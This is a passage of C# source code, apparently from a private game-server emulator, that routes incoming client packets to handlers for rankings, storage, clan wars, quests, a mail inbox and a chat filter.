#define NOTMULTIPLECHIPOWERS
using System;
using System.IO;
using System.Linq;
using System.Collections;
using System.Collections.Generic;
using MTA.Network.GamePackets;
using MTA.Client;
using System.Drawing;
using System.Text;
using MTA.Networking.GamePackets;
using MTA.Game;
using MTA.Interfaces;
using System.Collections.Concurrent;
using MTA.Network;

namespace MTA.Network
{
    public static class PacketHandler
    {
        public static string Filter(string Msg, GameState client)
        {
            #region AntiSpam
            foreach (var bad in Kernel.Insults)
            {
                if (Msg.StartsWith(bad))
                {
                    string star = "";
                    for (int i = 0; i < bad.Length; i++)
                    {
                        star += "*";
                    }
                    Msg = Msg.Replace(bad, star);
                    client.MessageBox("No More Insults ,Please [MTA].");
                }
                if (Msg.Contains(" " + bad))
                {
                    string star = "";
                    for (int i = 0; i < bad.Length; i++)
                    {
                        star += "*";
                    }
                    Msg = Msg.Replace(" " + bad, star);
                    client.MessageBox("No More Insults ,Please [MTA].");
                }
            }
            if (Msg.Contains("http:") || Msg.Contains("www.") || Msg.Contains(".com"))
            {
                var words = Msg.Split(new string[] { " " }, StringSplitOptions.None);
                for (int i = 0; i < words.Length; i++)
                {
                    var word = words[i];
                    if (word.EndsWith(".com") || word.EndsWith(".net") || word.StartsWith("www.") || word.Contains(".com"))
                    {
                        if (!word.Contains("Lucky") && !word.Contains("mediafire") && !word.Contains("gulfup"))
                            Msg = Msg.Replace(word, "*****.com");
                    }
                }
                client.MessageBox("You Can't Put Sites Here only allowed ones :).");
            }
            #endregion AntiSpam
            return Msg;
        }
        public static readonly DateTime UnixEpoch = new DateTime();
        public static uint UnixTimestamp
        {
            get { return (uint)(DateTime.UtcNow - UnixEpoch).TotalSeconds; }
        }
        public static ulong ClientSeal = BitConverter.ToUInt64(Program.Encoding.GetBytes("TQClient"), 0);
        public static string ReadString(byte[] data, ushort position, ushort count)
        {
            return Program.Encoding.GetString(data, position, count);

            //StringBuilder builder = new StringBuilder();         
            //for (byte i = 0; i < count; i = (byte)(i + 1))
            //{
            //    if (i > data.Length)
            //    {
            //        break;
            //    }
            //    byte num2 = data[(ushort)(i + position)];
            //    builder.Append((char)num2);
            //}
            //return builder.ToString().Replace("\0", "").Replace("\r", "");
        }
        public static void HandlePacket(byte[] packet, Client.GameState client)
        {
            Data gData = new Data(false);
            gData.Deserialize(packet);
            if (packet == null)
                return;
            if (client == null)
                return;
            ushort Length = BitConverter.ToUInt16(packet, 0);
            ushort ID = BitConverter.ToUInt16(packet, 2);

            if (client.Filtering)
                if (client.PacketFilter.Filter(ID))
                    return;

            if (ClientSeal != BitConverter.ToUInt64(packet, Length))
            {
                client.Disconnect();
                return;
            }
            if (ID == 1107)
            {
                if (client.Map.BaseID == 700)
                {
                    return;
                }
            }
            if (ID == 1056)
            {
                if (client.Entity.MapID == 1234 || client.Entity.MapID == 1235 || client.Entity.MapID == 1236 || client.Entity.MapID == 1237 || client.Entity.MapID == 1238)
                {
                    return;
                }
            }


            #region skip ping packet
            if (ID == 1009)
            {
                if (client.Action != 2)
                    return;
                ItemUsage usage = new ItemUsage(false);
                usage.Deserialize(packet);
                if (usage.ID == ItemUsage.Ping)
                {
                    client.Send(usage);
                    return;
                }
            }
            #endregion

            var _stream = new BinaryReader(new MemoryStream(packet));
            switch (ID)
            {
                #region [3251-3255] Perfection
                case 3251:
                    {
                        var Pr = new PerfectionItems();
                        var p = new byte[packet.Length - 8];
                        for (int i = 0; i < p.Length; i++)
                        {
                            p[i] = packet[i];
                        }
                        if (Pr.R(p))
                            Pr.Handle(p, client);
                        break;
                    }
                case 3253:
                    {
                        var pkt = new PerfectionScore();
                        var myPacket = new byte[packet.Length - 8];
                        for (int i = 0; i < myPacket.Length; i++)
                        {
                            myPacket[i] = packet[i];
                        }
                        if (pkt.Read(myPacket))
                            pkt.Handle(client);
                        break;
                    }
                case 3255:
                    {
                        var Pr = new PerfectionGUI();
                        var p = new byte[packet.Length - 8];
                        for (int i = 0; i < p.Length; i++)
                        {
                            p[i] = packet[i];
                        }
                        if (Pr.R(p))
                            Pr.Handle(client);
                        break;
                    }
                case 3256:
                    {
                        var pkt = new PerfectionRank();
                        var myPacket = new byte[packet.Length - 8];
                        for (int i = 0; i < myPacket.Length; i++)
                        {
                            myPacket[i] = packet[i];
                        }
                        if (pkt.Read(myPacket))
                            pkt.Handle(client);
                        break;
                    }
                case 3257:
                    {
                        switch (packet[5])
                        {
                            case 0:
                                {
                                    if (PrestigeRank.S != null)
                                        client.Send(PrestigeRank.S);
                                    break;
                                }
                            case 1:
                                {
                                    uint uid = PrestigeRank.R(packet)[2];
                                    if (!Kernel.GamePool.ContainsKey(uid))
                                        client.Send(PrestigeRank.Offline);
                                    else
                                        client.Send(WindowStats(Kernel.GamePool[uid]).ToArray());
                                    break;
                                }
                        }
                        break;
                    }
                #endregion 
                #region Coatstorage & Titlestorage (3300) && (3301)
                case 3300:
                    {
                        var pkt = new CoatStorage();

                        var myPacket = new byte[packet.Length - 8];

                        for (int i = 0; i < myPacket.Length; i++)
                        {
                            myPacket[i] = packet[i];
                        }

                        if (pkt.Read(myPacket))
                        {
                            pkt.Handle(client);
                        }
                        break;
                    }
                case 3301:
                    {
                        var pkt = new TitleStorage();

                        var myPacket = new byte[packet.Length - 8];

                        for (int i = 0; i < myPacket.Length; i++)
                        {
                            myPacket[i] = packet[i];
                        }

                        if (pkt.Read(myPacket))
                        {
                            pkt.Handle(client);
                        }
                        break;
                    }
                #endregion  
                #region Transfer
                case 2900:
                    {
                        switch (packet[4])
                        {
                            case 0:
                                {
                                    uint[] array = new uint[] { 37, 43 };
                                    byte[] Buffer = new byte[6 + 8 + 5 * array.Length];
                                    Writer.Ushort((ushort)(Buffer.Length - 8), 0, Buffer);
                                    Writer.Ushort(2901, 2, Buffer);
                                    Buffer[5] = (byte)array.Length;
                                    int offset = 6;
                                    for (int i = 0; i < array.Length; i++)
                                    {
                                        Writer.Uint(array[i], offset, Buffer); offset += 4;
                                        Buffer[offset] = 1; offset += 1;
                                    }
                                    client.Send(Buffer);
                                    break;
                                }
                            default:
                                PrintPacket(packet);
                                break;
                        }
                        break;
                    }
                case 2902:
                    {
                        if (Program.ServerTransfer)
                        {
                            if (!Kernel.TransferdPlayers.Contains(client.Entity.UID))
                                Kernel.TransferdPlayers.Add(client.Entity.UID);
                            byte serverid = packet[5];
                            client.Disconnect();
                        }
                        else
                            client.MessageBox("You Can't Transefer Now");
                        break;
                    }
                #endregion                               
                #region Mentor prize
                case 2067:
                    {
                        MentorPrize.Process(packet, client);
                        break;
                    }
                #endregion
                #region Roulette packets (2800 - 2810)
                case MaTrix.Roulette.GamePackets.MsgRouletteSignUp:
                    {
                        MaTrix.Roulette.MsgRouletteSignUp.Poroces(client, packet);
                        break;
                    }
                case MaTrix.Roulette.GamePackets.MsgRouletteCheck:
                    {
                        MaTrix.Roulette.MsgRouletteCheck.Poroces(client, packet);
                        break;
                    }
                case MaTrix.Roulette.GamePackets.MsgRouletteAction:
                    {
                        MaTrix.Roulette.MsgRouletteAction.Poroces(client, packet);
                        break;
                    }
                #endregion
                #region Clone Attack
                case 2812:
                    {
                        var attackd = BitConverter.ReadUint(packet, 4);
                        var clonecount = packet[8];
                        for (int i = 0; i < clonecount; i++)
                        {
                            var attackr = BitConverter.ReadUint(packet, 9 + (i * 4));
                            if (client.Entity.MyClones.Count < clonecount)
                                return;
                            var attack = client.Entity.AttackPacket;
                            if (attack == null)
                                attack = new GamePackets.Attack(true);
                            attack.Attacker = attackr;
                            attack.Attacked = attackd;

                            if (client.Entity.MyClones.Count == 0)
                                return;
                            if (attackd == client.Entity.UID || client.Entity.MyClones.ContainsKey(attackd))
                                return;
                            MTA.Database.SpellInformation MySpell = null;
                            try
                            {
                                MySpell = Database.SpellTable.GetSpell(client.Spells[12090].ID, client.Spells[12090].Level);
                            }
                            catch { MySpell = Database.SpellTable.GetSpell(12090, 4); }
                            Entity Clone = null;
                            if (client.Entity.MyClones.TryGetValue(attackr, out Clone))
                            {
                                Entity attacked = null;
                                SobNpcSpawn attackedsob = null;
                                if (client.Screen.TryGetValue(attackd, out attacked))
                                {
                                    uint damage = 0;
                                    var spell = Database.SpellTable.GetSpell(attack.MagicType, (byte)attack.MagicLevel);
                                    if (spell == null)
                                        spell = Database.SpellTable.GetSpell(12080, 0);
                                    if (attack.AttackType == GamePackets.Attack.Melee)
                                    {
                                        if (Game.Attacking.Handle.CanAttack(client.Entity, attacked, spell, true))
                                        {
                                            damage = Game.Attacking.Calculate.Melee(client.Entity, attacked, spell, ref attack);
                                            double power = (0.5);
                                            damage = (uint)((double)damage * power / 8);
                                            Game.Attacking.Handle.ReceiveAttack(Clone, attacked, attack, ref damage, spell);
                                            attack.Damage = damage;
                                            client.SendScreen(attack);
                                        }
                                    }
                                    else
                                    {
                                        if (Game.Attacking.Handle.CanAttack(client.Entity, attacked, spell, false))
                                        {
                                            damage = Game.Attacking.Calculate.Magic(client.Entity, attacked, spell, ref attack);
                                            double power = (0.5);
                                            damage = (uint)((double)damage * power / 8);
                                            Game.Attacking.Handle.ReceiveAttack(Clone, attacked, attack, ref damage, spell);
                                            attack.Damage = damage;
                                            client.SendScreen(attack);
                                        }
                                    }
                                    SpellUse suse = new SpellUse(true);
                                    suse.Attacker = Clone.UID;
                                    suse.SpellID = spell.ID;
                                    suse.SpellLevel = spell.Level;
                                    suse.X = attacked.X;
                                    suse.Y = attacked.Y;
                                    suse.Effect1 = attack.Effect1;
                                    suse.AddTarget(attacked, damage, attack);
                                    client.SendScreen(suse, true);
                                    if (client.Account.State == MTA.Database.AccountTable.AccountState.GM)
                                        client.Send(new Message("Clone Attack With  Skill: " + spell.Name, System.Drawing.Color.CadetBlue, Message.Talk));

                                }
                                else if (client.Screen.TryGetSob(attackd, out attackedsob))
                                {
                                    uint damage = 0;
                                    var spell = Database.SpellTable.GetSpell(attack.MagicType, (byte)attack.MagicLevel);
                                    if (spell == null)
                                        spell = Database.SpellTable.GetSpell(12080, 0);
                                    if (attack.AttackType == GamePackets.Attack.Melee)
                                    {
                                        if (Game.Attacking.Handle.CanAttack(client.Entity, attackedsob, null))
                                        {
                                            damage = Game.Attacking.Calculate.Melee(client.Entity, attackedsob, ref attack);
                                            double power = ((MySpell.Power / 100.0) / 100.0);
                                            damage = (uint)((double)damage * power);
                                            Game.Attacking.Handle.ReceiveAttack(Clone, attackedsob, attack, damage, null);
                                            attack.Damage = damage;
                                            client.SendScreen(attack);
                                        }
                                    }
                                    else
                                    {
                                        if (Game.Attacking.Handle.CanAttack(client.Entity, attackedsob, spell))
                                        {
                                            damage = Game.Attacking.Calculate.Magic(client.Entity, attackedsob, spell, ref attack);
                                            double power = ((MySpell.Power / 100.0) / 100.0);
                                            damage = (uint)((double)damage * power);
                                            Game.Attacking.Handle.ReceiveAttack(Clone, attackedsob, attack, damage, spell);
                                            attack.Damage = damage;
                                            client.SendScreen(attack);
                                        }
                                    }
                                    SpellUse suse = new SpellUse(true);
                                    suse.Attacker = Clone.UID;
                                    suse.SpellID = spell.ID;
                                    suse.SpellLevel = spell.Level;
                                    suse.X = attackedsob.X;
                                    suse.Y = attackedsob.Y;
                                    suse.Effect1 = attack.Effect1;
                                    suse.AddTarget(attackedsob, damage, attack);
                                    client.SendScreen(suse, true);
                                    if (client.Account.State == MTA.Database.AccountTable.AccountState.GM)
                                        client.Send(new Message("Clone Attack With  Skill: " + spell.Name, System.Drawing.Color.CadetBlue, Message.Talk));

                                }
                            }
                        }
                        break;
                    }
                #endregion
                #region Fast Ins
                case 2204:
                    {
                        byte count = packet[4];
                        List<uint> item_uids = new List<uint>();
                        int offset = 5;
                        for (int i = 0; i < count; i++)
                        {
                            item_uids.Add(BitConverter.ReadUint(packet, offset));
                            offset += 4;
                        }
                        for (int i = 0; i < item_uids.Count; i++)
                        {
                            var UID = item_uids[i];
                            var item = Database.ConquerItemTable.LoadItem(UID);
                            if (item != null)
                            {
                                int arsenalRealPosition = ArsenalPosition(item.ID);
                                if ((item.ID % 10) >= 8 && !item.Inscribed)
                                {
                                    if (client.Entity.GuildID != 0 && client.Guild != null && client.Guild.Arsenals[arsenalRealPosition].Unlocked)
                                    {
                                        item.Inscribed = true;
                                        item.Mode = Game.Enums.ItemMode.Update;
                                        item.Send(client);
                                        var Arsenal = client.Guild.Arsenals[arsenalRealPosition];
                                        Arsenal.AddItem(item, client);
                                        client.Guild.SaveArsenal();
                                    }
                                }
                            }
                        }

                        break;
                    }
                #endregion
                #region GuildRanksTop 20
                case 2101:
                    {
                        if (client.Guild == null) return;
                        ushort Rank = packet[4];
                        ushort displyPage = (ushort)Math.Min(2, (int)packet[5]);


                        switch (Rank)
                        {
                            case Enums.GuildRanksTop20Type.SilverRank:
                                {

                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankSilversDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);

                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.SilverDonation);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.CpRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankCPDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);

                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.ConquerPointDonation);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.GuideDonation:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankGuideDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);

                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.VirtutePointes);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.PkRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankPkDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);

                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.PkDonation);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.ArsenalRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankArsenalDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);

                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.ArsenalDonation);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;

                                }
                            case Enums.GuildRanksTop20Type.RosesRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankRosseDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);

                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.Rouses);
                                    }
                                    client.Send(ranks.ToArray());


                                    break;
                                }
                            case Enums.GuildRanksTop20Type.OrchidRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankOrchidsDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;

                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);
                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.Orchids);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.LilyRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankLiliesDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);
                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.Lilies);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.TulipRank:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankTulipsDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);
                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.Tulips);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            case Enums.GuildRanksTop20Type.TotalDonaion:
                                {
                                    Game.ConquerStructures.Society.Guild.Member[] rank_members = client.Guild.RankTotalDonations;
                                    int offset = displyPage * Enums.GuildRanksTop20Type.MaxCounts;
                                    ushort count = (ushort)Math.Min(Enums.GuildRanksTop20Type.MaxCounts, rank_members.Length);
                                    if (displyPage == 2 && rank_members.Length < 10)
                                        break;
                                    GamePackets.GuildRanks ranks = new GamePackets.GuildRanks(count);
                                    ranks.Rank = Rank;
                                    ranks.Page = displyPage;
                                    for (byte x = 0; x < count; x++)
                                    {
                                        if (rank_members.Length < offset + x)
                                            break;
                                        var element = rank_members[offset + x];
                                        ranks.Aprend(element, element.TotalDonation);
                                    }
                                    client.Send(ranks.ToArray());

                                    break;
                                }
                            default:
                                {
                                    Console.WriteLine("[packet = " + 2101 + "] unfind typ " + Rank + "");
                                    break;
                                }


                        }
                        break;
                    }
                #endregion
                #region ClanCityWar (1313)
                case 1313:
                    {
                        if (packet[4] == 0)//Apply
                        {
                            if (client.Entity.Money < 100)
                            {
                                client.Entity.SendSysMesage("Sorry Don't Have 100 Silver Come When You Have it");
                            }
                            else
                            {
                                client.Entity.SendSysMesage("Your Apply Successfully");
                                client.Entity.GetClan.CalnWar = true;
                                client.Entity.Money -= 100;
                            }
                        }
                        else if (packet[4] == 1)//Cancel
                        {
                            client.Entity.SendSysMesage("Your Cancel Successfully");
                            client.Entity.GetClan.CalnWar = false;
                        }
                        else if (packet[4] == 2)//Unknown
                        {
                            client.Entity.SendSysMesage("Testaaaaaaaaa");
                        }
                        else if (packet[4] == 6)//Npc information
                        {
                            uint NpcUid = BitConverter.ToUInt32(packet, 12);
                            client.JoinToWar = NpcUid;
                            var tournament = ClanWarArena.GetNpcTournament(NpcUid);
                            if (tournament != null)
                            {
                                var obj = tournament.Client;
                                if (obj != null)
                                {
                                    Writer.WriteUInt32(obj.UID, 8, packet);
                                    Writer.WriteString(obj.Name, 20, packet);
                                    Writer.WriteString(obj.DominationMap, 56, packet);

                                    if (client.Entity.ClanRank == Clan.Ranks.ClanLeader)
                                    {
                                        if (client.Entity.GetClan.CalnWar == false)
                                        {
                                            packet[16] = 5;//Apply
                                        }
                                    }
                                    if (client.Entity.ClanRank == Clan.Ranks.ClanLeader)
                                    {
                                        if (client.Entity.GetClan.CalnWar == true)
                                        {
                                            packet[16] = 3;//Cancel
                                        }
                                    }

                                    //packet[4] = 4;//Register Gui

                                    if (tournament.Open)
                                        packet[92] = 1;//Enter

                                    packet[93] = 1;
                                    packet[94] = 1;
                                    Writer.WriteUInt32(obj.OccupationDays, 96, packet);
                                    Writer.WriteUInt32(obj.Reward, 100, packet);
                                    Writer.WriteUInt32(obj.NextReward, 104, packet);

                                    packet[120] = 100;

                                    client.Send(packet);
                                }
                            }
                        }
                        else if (packet[4] == 8)//Enter
                        {
                            if (client.JoinToWar != 0)
                            {
                                if (client.Entity.GetClan == null)
                                {
                                    client.Entity.SendSysMesage("Sorry You Not Have Clan To Join!");
                                    break;
                                }
                                else if (client.Entity.GetClan.CalnWar == false)
                                {
                                    client.Entity.SendSysMesage("Sorry Your Clan Not Apply To Join!");
                                    break;
                                }
                                var tournament = ClanWarArena.GetNpcTournament(client.JoinToWar);
                                if (tournament != null)
                                {
                                    tournament.Teleport(client);
                                }
                            }
                        }
                        break;
                    }
                #endregion
                #region 1134: Quest
                case 1135:
                    {
                        MaTrix.QuestData quest = new MaTrix.QuestData(true);
                        quest.Deserialize(packet);
                        break;
                    }
                case 1134:
                    {
                        MaTrix.QuestPacket quest = new MaTrix.QuestPacket(false);
                        quest.Deserialize(packet);
                        switch (quest.Action)
                        {
                            case MaTrix.QuestPacket.QuestAction.Begin:
                                {
                                    if (client.Quests.AllowAccept())
                                        client.Quests.Accept((MaTrix.QuestID)quest[0].UID, 0);
                                    client.Send(quest);
                                    break;
                                }
                            case MaTrix.QuestPacket.QuestAction.List:
                                {
                                    if (quest.Amount < 80)
                                        client.Quests.SendFullGUI();
                                    break;
                                }
                        }
                        break;
                    }
                #endregion

                #region BigBOsReward
                /* case 1315:
                    {                       
                        switch (packet[4])
                        {
                            case 0:
                                {
                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                    Event.Send(client);
                                    break;
                                }
                            case 2:
                                {
                                    foreach (MTA.Database.BigBOsBaisReward.Reward re in MTA.Database.BigBOsBaisReward.RewardBase.Values)
                                    {
                                        if (re.Type == packet[14])
                                        {
                                            switch (re.Type)
                                            {
                                                #region BigBOS_Quest_Reward
                                                case 1:
                                                    {
                                                        if (client.Entity.BigBOS_Quest_Reward_Point >= re.NeedPoints && re.Type == 1)
                                                        {
                                                            if (!client.ClamiedReward.ContainsKey(re.ID))
                                                            {
                                                                if (client.Inventory.Add(re.GiveReward, 0, 1))
                                                                {
                                                                    Database.RewardClameID.InsertNewClam(client, re.ID, re.GiveReward);
                                                                    client.Entity.BigBOS_Quest_Reward_Clamied++;
                                                                    client.ClamiedReward.Add(re.ID, re.GiveReward);
                                                                    Database.BigBOSRewardDataBase.SaveReward(client);
                                                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                                                    Event.Send(client);
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                #endregion
                                                #region Credit_Reward
                                                case 2:
                                                    {
                                                        if (client.Entity.Credit_Reward_Point >= re.NeedPoints && re.Type == 2)
                                                        {
                                                            if (!client.ClamiedReward.ContainsKey(re.ID))
                                                            {
                                                                if (client.Inventory.Add(re.GiveReward, 0, 1))
                                                                {
                                                                    Database.RewardClameID.InsertNewClam(client, re.ID, re.GiveReward);
                                                                    client.Entity.Credit_Reward_Clamied++;
                                                                    client.ClamiedReward.Add(re.ID, re.GiveReward);
                                                                    Database.BigBOSRewardDataBase.SaveReward(client);
                                                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                                                    Event.Send(client);
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                #endregion
                                                #region Online_Reward_
                                                case 3:
                                                    {
                                                        if (client.Entity.Online_Reward_Point >= re.NeedPoints && re.Type == 3)
                                                        {
                                                            if (!client.ClamiedReward.ContainsKey(re.ID))
                                                            {
                                                                if (client.Inventory.Add(re.GiveReward, 0, 1))
                                                                {
                                                                    Database.RewardClameID.InsertNewClam(client, re.ID, re.GiveReward);
                                                                    client.Entity.Online_Reward_Clamied++;
                                                                    client.ClamiedReward.Add(re.ID, re.GiveReward);
                                                                    Database.BigBOSRewardDataBase.SaveReward(client);
                                                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                                                    Event.Send(client);
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                #endregion
                                                #region Kill_Reward
                                                case 4:
                                                    {
                                                        if (client.Entity.Kill_Reward_Point >= re.NeedPoints && re.Type == 4)
                                                        {
                                                            if (!client.ClamiedReward.ContainsKey(re.ID))
                                                            {
                                                                if (client.Inventory.Add(re.GiveReward, 0, 1))
                                                                {
                                                                    Database.RewardClameID.InsertNewClam(client, re.ID, re.GiveReward);
                                                                    client.Entity.Kill_Reward_Clamied++;
                                                                    client.ClamiedReward.Add(re.ID, re.GiveReward);
                                                                    Database.BigBOSRewardDataBase.SaveReward(client);
                                                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                                                    Event.Send(client);
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                #endregion
                                                #region King_Reward
                                                case 5:
                                                    {
                                                        if (client.Entity.King_Reward_Point >= re.NeedPoints && re.Type == 5)
                                                        {
                                                            if (!client.ClamiedReward.ContainsKey(re.ID))
                                                            {
                                                                if (client.Inventory.Add(re.GiveReward, 0, 1))
                                                                {
                                                                    Database.RewardClameID.InsertNewClam(client, re.ID, re.GiveReward);
                                                                    client.Entity.King_Reward_Clamied++;
                                                                    client.ClamiedReward.Add(re.ID, re.GiveReward);
                                                                    Database.BigBOSRewardDataBase.SaveReward(client);
                                                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                                                    Event.Send(client);
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                #endregion
                                                #region Arena_Reward
                                                case 7:
                                                    {
                                                        if (client.Entity.Arena_Reward_Point >= re.NeedPoints && re.Type == 7)
                                                        {
                                                            if (!client.ClamiedReward.ContainsKey(re.ID))
                                                            {
                                                                if (client.Inventory.Add(re.GiveReward, 0, 1))
                                                                {
                                                                    Database.RewardClameID.InsertNewClam(client, re.ID, re.GiveReward);
                                                                    client.Entity.Arena_Reward_Clamied++;
                                                                    client.ClamiedReward.Add(re.ID, re.GiveReward);
                                                                    Database.BigBOSRewardDataBase.SaveReward(client);
                                                                    Database.BigBOsReward Event = new Database.BigBOsReward(1);
                                                                    Event.Send(client);
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                #endregion
                                            }
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }   */
                #endregion
                #region inbox
                case 1046:
                    {
                        uint page = BitConverter.ReadUint(packet, 8);
                        MaTrix.Inbox inbox = new MaTrix.Inbox();
                        inbox.check(client.Prizes, page);
                        inbox.Send(client);
                        break;
                    }
                case 1045:
                    {
                        uint Type = BitConverter.ReadUint(packet, 4);
                        uint id = BitConverter.ReadUint(packet, 8);
                        switch (Type)
                        {
                            case 1://show
                                {
                                    byte[] inbox = new byte[272];
                                    Writer.Ushort((ushort)(inbox.Length - 8), 0, inbox);
                                    Writer.Ushort(1048, 2, inbox);
                                    Writer.Uint(id, 4, inbox);//id    
                                    Writer.WriteString(client.Prizes[id].Message, 8, inbox);//string
                                    client.Send(inbox);
                                    break;
                                }
                            case 2://delete
                                {
                                    if (client.Prizes.ContainsKey(id))
                                        client.Prizes.Remove(id);
                                    if (client.Prizes.Count == 0)
                                        MaTrix.Inbox.SendInbox(client, false);
                                    MaTrix.Inbox.Save(client);
                                    break;
                                }
                            case 3://Money
                                {
                                    client.Entity.Money += client.Prizes[id].goldprize;
                                    client.Prizes[id].goldprize = 0;
                                    break;
                                }
                            case 4://ConquerPoints
                                {
                                    client.Entity.ConquerPoints += client.Prizes[id].cpsprize;
                                    client.Prizes[id].cpsprize = 0;
                                    break;
                                }
                            case 6:
